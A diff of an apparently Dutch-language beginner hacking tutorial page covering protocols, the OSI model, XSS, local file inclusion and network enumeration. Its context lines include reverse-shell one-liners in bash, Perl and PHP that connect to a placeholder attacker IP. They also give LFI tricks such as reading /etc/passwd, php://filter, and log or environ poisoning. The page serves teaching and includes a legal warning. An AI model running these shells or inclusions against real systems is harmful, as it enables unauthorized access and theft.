@@ -295,7 +295,7 @@ img {
 <h1>Voorwoord</h1>
 <p>In het kader van <a href="https://www.laatjeniethackmaken.nl" title="laatjeniethackmaken.nl">https://www.laatjeniethackmaken.nl</a> heb ik besloten om juist het tegenovergestelde te gaan maken. Gatochhacken.nl. Waarom ga toch hacken? Omdat er veel vragen zijn en mensen wel met security willen beginnen maar eigenlijk erg veel moeite hebben met het vinden van de juiste informatie in een voor hen begrijpelijke taal (Nederlands). </p>
 <p>Ik ga je niet leren hacken, dat is iets wat je zelf met veel oefening zal moeten doen. Het enige wat ik kan doen is begrippen uitleggen, de ene keer iets uitgebreider dan de andere, en je doorverwijzen naar bronwebsites waar je vervolginformatie kunt vinden. Het is onmogelijk om al deze informatie in één document te bundelen.</p>
-<p>Daarnaast verwacht ik van iemand die wil leren hacken dat er een zekere mate van intrinsieke nieuwsgierigheid aanwezig is en dat je jezelf wilt gaan inlezen. Om te voorkomen dat je afhaakt zal er wel wat text zijn om de linkjes aan elkaar te plakken. Deze pagina is overigens permanent under construction.</p>
+<p>Daarnaast verwacht ik van iemand die wil leren hacken dat er een zekere mate van intrinsieke nieuwsgierigheid aanwezig is en dat je jezelf wilt gaan inlezen. Om te voorkomen dat je afhaakt zal er wel wat text zijn om de linkjes aan elkaar te plakken. Deze pagina is overigens permanent under construction. Spot je een foutje, of heb je een verzoekje voor inhoud, maak dan een <a href="https://github.com/gatochhacken/gatochhacken.github.io/issues">issue</a> aan op <a href="https://www.github.com">github</a>.</p>
 <p><strong>LET OP</strong> alle technieken, code voorbeelden en andere informatie zijn technieken waarmee je kan hacken. Deze toepassen op een systeem waar jij geen toestemming hebt om dit te doen is een strafbaar feit! (artikel <a href="http://wetten.overheid.nl/jci1.3:c:BWBR0001854&amp;boek=Tweede&amp;titeldeel=V&amp;artikel=138ab">138ab</a> wetboek van strafrecht) Bega geen fout, wil je oefenen en dingen proberen, kijk dan op de website van <a href="https://www.certifiedsecure.com" title="Certified Secure">https://www.certifiedsecure.com</a></p>
 <h1>Protocollen</h1>
 <p>Het is ontzettend belangrijk dat je protocollen leert kennen, immers het kennen van protocollen zorgt voor een grotere flexibiliteit in aanvallen en een grotere onafhankelijkheid van tooling. Mocht je het protocol al kennen, dan kun je zelf eenvoudiger een tool schrijven die je bij een aanval ondersteund.</p>
@@ -325,38 +325,24 @@ Hallo! Ik bedank je voor verzoek! Hier heb je mijn pagina als antwoord :)
 <p><strong>HEAD</strong>, doet hetzelfde als de hierboven genoemde GET request maar dan met als verschil dat de request body niet meegezonden wordt.</p>
 <p><strong>TRACE</strong>, met TRACE geeft de webserver de, door jou verzonden request headers weer zodat je kan zien of er tussen jou, en de webserver, nog aanpassingen gedaan zijn. 
 Start wireshark op je ingerichte lab machine en kijk eens wat er gebeurd als je met de request generator gaat spelen.</p>
-<h2>FTP</h2>
-<h2>ICMP</h2>
+<h2><a href="https://tools.ietf.org/html/rfc959">FTP</a></h2>
+<h2><a href="https://tools.ietf.org/html/rfc792">ICMP</a></h2>
 <h2>OSI-model</h2>
 <p>Alhoewel het OSI(Open Systems Interconnection)-model geen protocol is is het wel iets wat handig is om in je achterhoofd te houden als je iets wilt gaan doen met netwerk hacking. Het OSI-model bestaat uit 7 lagen. Hoe hoger de laag, des te dichter je bij de gebruiker aangekomen bent. Hieronder spits ik het toe op een TCP/IP stack, wil je iets anders hierover lezen dan is google een goede start. De lagen zijn als volgt:</p>
-<ol>
-<li><strong>Physical</strong></li>
-</ol>
+<p><strong>Laag 1: Physical</strong></p>
 <p>De fysieke laag zorgt er voor dat de data die jij over een netwerk wilt verzenden ook daadwerkelijk op de kabel komt, en dat de data die mensen over het netwerk verzenden ook daadwerkelijk bij jouw systeem komt. Voorbeelden van deze protocollen zijn DSL, ISDN, CAN bus en WIFI. Als er iets ontvangen is, gaat deze informatie naar laag 2.
 Dit kun je vergelijken met het posten van de brief, of het uit de brievenbus halen van je brief.</p>
-<ol>
-<li><strong>Datalink</strong></li>
-</ol>
+<p><strong>Laag 2: Datalink</strong></p>
 <p>De datalink laag bepaald de manier hoe er gecommuniceerd word en met wie. In deze laag zul je ook vaak foutcorrectie vinden. Voorbeelden van protocollen op deze laag zijn ethernet, CHAP en ARP. Dit kan je vergelijken met een adres die op de enveloppe geschreven wordt of of afgelezen wordt. </p>
-<ol>
-<li><strong>(inter)Network</strong></li>
-</ol>
+<p><strong>Laag 3: (inter)Network</strong></p>
 <p>In deze laag vind je de IPv4 protocollen en de IPv6 protocollen zowel als IPSec en NAT. In deze laag wordt het mogelijk gemaakt om verschillende netwerken aan elkaar te knopen en routing toe te passen. Een bijkomend voordeel is dat bij het IP protocol hier IP adressen ontstaan die voor mensen normaal te lezen zijn. Dit kan je vergelijken met het opschrijven of aflezen van de postcode.</p>
-<ol>
-<li><strong>Transport</strong></li>
-</ol>
+<p><strong>Laag 4: Transport</strong></p>
 <p>In de transport laag wordt end-to-end communicatie mogelijk gemaakt, hier wordt in feite de envelop gemaakt waar de boodschap in gaat. Bij sommige protocollen worden hier ook betrouwbaarheidsmaatregelen genomen, zoals bijvoorbeeld bij TCP. Bij TCP schrijf je ook een antwoordbevestiging op de envelop.</p>
-<ol>
-<li><strong>Session</strong></li>
-</ol>
+<p><strong>Laag 5: Session</strong></p>
 <p>Deze laag beheert de sessies die tussen twee communicerende partijen bestaan, het houd de verbinding open of sluit hem af als hij niet meer noodzakelijk is. Hierbij kan je denken aan SSH, SMB of RDP.</p>
-<ol>
-<li><strong>Presentation</strong></li>
-</ol>
+<p><strong>Laag 6: Presentation</strong></p>
 <p>De presentatie laag is de plaats waar de informatie een encoding,compressie of encryptie krijgt (of het omgekeerde natuurlijk). Deze laag is niet altijd eenvoudig te duiden, HTTP kan in sommige visies namelijk zowel onder de presentatie als de applicatie laag vallen.</p>
-<ol>
-<li><strong>Application</strong></li>
-</ol>
+<p><strong>Laag 7: Application</strong></p>
 <p>De applicatielaag is de hoogste laag van het OSI model en deze laag ligt erg dicht bij een eindgebruiker en hij zal deze dan meestal ook het vaakst kennen. Binnen deze laag vallen protocollen als DNS, WEBDav, HTTP en FTP. Dit zijn protocollen waarmee computers direct met elkaar kunnen communiceren over de (met de lagere lagen) opgezette telecommunicatie- en computernetwerken.</p>
 <p>In laag 1 wordt de informatie uitgedrukt in bits, in laag 2 spreken we over frames. In laag 3 over packets en laag 4 over segments. Alles boven laag 4 is data.</p>
 <p>Er zijn diverse ezelsbruggetjes om het OSI-model te onthouden. Één hiervan is <em>All people should try new dairy products</em>	</p>
@@ -379,7 +365,7 @@ bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
 <pre><code>perl -e 'use Socket;$i=&quot;IP&quot;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
 </code></pre>
 
-<h3>PHP</h3>
+<h3><a href="https://www.php.net">PHP</a></h3>
 <pre><code>php -r '$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
 </code></pre>
 
@@ -435,7 +421,7 @@ Op Wordpress websites is het, standaard, mogelijk om de inlognamen van auteurs t
 <h4>Stored XSS</h4>
 <p>Stored of persistent XSS is een techniek waarbij een fout in de input sanitization het opslaan van je aanval mogelijk maakt. Dit soort aanvallen maken meer slachtoffers omdat iedereen die de specifieke pagina bezoekt er mee besmet zal worden.</p>
 <h4>DOM XSS</h4>
-<p>DOM (Document Object Model) XSS is een methode waarbij een aanvaller de kwaadaardige code op zo een manier plaatst dat het nooit via de webserver loopt. Dit kan bijvoorbeeld als javascript gebruik maakt van de URL van een webpagina zonder hierop een juiste input sanitization te doen.</p>
+<p>DOM (Document Object Model) XSS is een methode waarbij een aanvaller de kwaadaardige code op zo een manier plaatst dat het nooit via de webserver loopt. Dit kan bijvoorbeeld als <a href="https://nl.wikipedia.org/wiki/JavaScript">javascript</a> gebruik maakt van de URL van een webpagina zonder hierop een juiste input sanitization te doen.</p>
 <h2>Local file inclusion</h2>
 <p>LFI is een aanvalstechniek die volledig Local File Inclusion heet. Het is een kwetsbaarheid waarbij een applicatie gebruikersinvoer niet op een juiste wijze bewerkt. Door deze kwetsbaarheid te misbruiken krijg je de mogelijkheid om bestanden in te laden waar dit (eigenlijk) niet de bedoeling was. Op deze manier kan je potentieel bestanden lezen als /etc/passwd of andere gevoelige bestanden.</p>
 <p>File includes zijn redelijk te herkennen aan de parameters achter een pagina naam. Denk hierbij aan een GET parameter als file of page. Vaak zie je hier dan een bestandsnaam staan. In de submappen zijn enkele opdrachten te vinden waarmee je zelf met LFI kunt spelen.</p>
@@ -480,7 +466,7 @@ Op Wordpress websites is het, standaard, mogelijk om de inlognamen van auteurs t
 <h4>php://fd</h4>
 <h4>php://memory en php://temp</h4>
 <h4>php://filter</h4>
-<p>In sommige gevallen kan je enkel gebruik maken van filters om informatie uit te lezen. </p>
+<p>In sommige gevallen kan je enkel gebruik maken van <a href="http://php.net/manual/en/filters.php">filters</a> om informatie uit te lezen. </p>
 <p>De syntax van filters is als volgt:</p>
 <pre><code>php://filter/&lt;type&gt;.&lt;filter&gt;/&lt;parameter&gt;
 </code></pre>
@@ -499,7 +485,7 @@ Dit zijn specifieker:</p>
 <h4>/proc/self/fd/[0-35]</h4>
 <p>In een van de filedescriptors van het huidige proces staat de Apache error log weggeschreven. Je kan zelf php code in de logging wegschrijven en deze later weer opvragen. Als je nieuwsgierig bent kan je de logbestanden in /var/log zelf bekijken en zien welke log bestanden je hiervoor zal kunnen misbruiken.</p>
 <h4>/proc/self/environ</h4>
-<p>Als je de environ file kan includen dan heb je de beschikking over de environmental variabelen waaronder de applicatie op dat moment draait. Een van de gebruikersgegevens die in deze environmental variabelen terecht komt is de user agent. Doormiddel van handige Firefox plugin zoals uaswitcher1 kan je zelf je useragent aanpassen en hier bijvoorbeeld PHP code in plaatsen. </p>
+<p>Als je de environ file kan includen dan heb je de beschikking over de environmental variabelen waaronder de applicatie op dat moment draait. Een van de gebruikersgegevens die in deze environmental variabelen terecht komt is de user agent. Doormiddel van handige Firefox plugin zoals <a href="https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/">uaswitcher</a> kan je zelf je useragent aanpassen en hier bijvoorbeeld PHP code in plaatsen. </p>
 <h1>Netwerk aanvallen</h1>
 <h2>Enumeratie</h2>
 <p>Ook op netwerken is het erg belangrijk om een juiste enumeratie te doen. Het weten welke hosts er in het netwerk zijn en welke hosts er allemaal beschikbaar zijn om aan te vallen is één van de belangrijkste gegevens.</p>
